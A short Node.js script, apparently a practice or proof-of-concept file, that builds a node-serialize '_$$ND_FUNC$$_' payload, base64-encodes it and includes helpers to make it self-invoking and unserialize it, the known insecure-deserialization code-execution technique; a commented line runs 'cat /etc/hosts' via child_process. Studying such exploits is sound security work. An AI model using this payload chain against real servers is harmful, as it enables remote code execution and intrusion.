const serialize = require("node-serialize");
const express = require("express");
var escape = require('escape-html');

// require(`child_process`).exec(`cat /etc/hosts`, function(error, stdout, stderr) { console.log(stdout) });

// _$$ND_FUNC$$_

const jsonPayload = {
  name: "bar",
  rce: "_$$ND_FUNC$$_console.log(obj)",
}

console.log(jsonPayload)
const payLoadStringified = JSON.stringify(jsonPayload)
console.log(payLoadStringified)
const payloadB64 = encodeToBase64(payLoadStringified);
console.log(payloadB64);

//let serializedPayload = serialize.serialize(jsonPayload);
//console.log({serializedPayload})
//let payloadIIFE = makePayloadIIFE(serializedPayload);
//console.log({payloadIIFE})
//let payloadB64 = encodeToBase64(payloadIIFE);
//console.log(payloadB64)
//let result = unserializePayload(payloadB64);
//console.log(result)

function unserializePayload(base64EncodedPayload) {
  const buffer = new Buffer(base64EncodedPayload, 'base64').toString();
  const json = serialize.unserialize(buffer);
  return json;
}

function encodeToBase64(str) {
  return Buffer.from(str).toString('base64');
}

function makePayloadIIFE(payload) {
  return payload.substring(0, payload.length-2) +'()"}';
}
